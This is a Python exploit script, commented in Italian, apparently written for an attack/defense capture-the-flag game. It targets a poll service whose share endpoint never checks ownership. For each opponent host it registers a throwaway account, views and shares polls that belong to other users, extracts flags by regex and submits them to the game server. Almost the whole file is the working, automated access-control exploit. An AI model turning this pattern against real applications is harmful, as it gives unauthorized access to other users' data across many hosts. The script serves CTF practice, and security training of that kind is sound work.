'''

L'obiettivo di questo exploit/attacco è quello di condividere un sondaggio accedendo come (nuovo) utente che non
è il proprietario del sondaggio stesso.
Una volta recuperata la lista dei poll_ids, iterando su ognuno di essi, si visualizza il sondaggio corrispodente al corrente
poll_id e si tenta la condivisione. 
L'operazione dovrebbe avere successo in quanto nel codice dell'applicazione manca un controllo che verifica se l'utente
che sta cercando di condividere il sondaggio è il proprietario di quest ultimo.

'''



import requests
import json
import random
import string
import re




# Specifico il mio indirizzo IP e quello del dispositivo NOP, che saranno poi esclusi dall'attacco
my_ip = '11.0.1.1'
nop_ip = '11.0.0.1'
header = {"X-Team-Token": "9b8fec624b7ea21a"}
# Ricordiamo che una flag è una stringa alfanumerica di 31 caratteri seguiti da un =
flag_regex = re.compile(r"[A-Z0-9]{31}=")

# Otteniamo i dati degli avversari
opponents = requests.get("http://11.11.0.1:8080/api/client/attack_data").text
opponents = json.loads(opponents)
# Prelevo le informazioni riguardo il servizio che mi interessa
opponents = opponents['Polls']
opponents.pop(my_ip)
opponents.pop(nop_ip)





def submit_flags(payload):
    url = "http://11.11.0.1:8080/flags"
    print(requests.put(url, headers = header, json = payload).text)




def exploit():
    for ip, poll_ids in opponents.items():
        try:
            payload = []
            # Generazione casuale per ottenere le credenziali di un utente fittizio
            username_length = random.randint(5, 64)
            password_length = random.randint(5, 64)
            data = {
                "username": ''.join(random.choices(string.digits, k = username_length)),
                "password": ''.join(random.choices(string.digits, k = password_length))
            }

            # Creiamo una sessione per l'utente
            s = requests.Session()

            # Registrazione e login 
            s.post(f"http://{ip}:5000/register", data = data)
            s.post(f"http://{ip}:5000/login", data = data)

            for poll_id in poll_ids:
                # Visualizziamo il sondaggio inviando una get all'endpoint show_poll e fornendo come parametro nell'URL
                # il poll_id appena estratto (ricordiamo che stiamo cercando di aggirare il sistema, poichè avendo creato
                #  un nuovo utente, quest'ultimo ha una dashboard vuota)
                poll_response = s.get(f"http://{ip}:5000/show_poll/{poll_id}")
                if poll_response.status_code == 200:
                    # Proviamo a condividere il sondaggio, nonostante non siamo i proprietari
                    share_response = s.post(f"http://{ip}:5000/share_poll/{poll_id}")
                    if share_response.status_code == 200:
                        flags = flag_regex.findall(poll_response.text)  
                        print(f"Trovate flag da {ip}: {flags}")
                        payload.extend(flags)

            # Invia le flag trovate al sistema centrale
            if payload:
                submit_flags({"flags": payload})

        except Exception as e:
            print(f"Failed to exploit {ip}! {str(e)}")
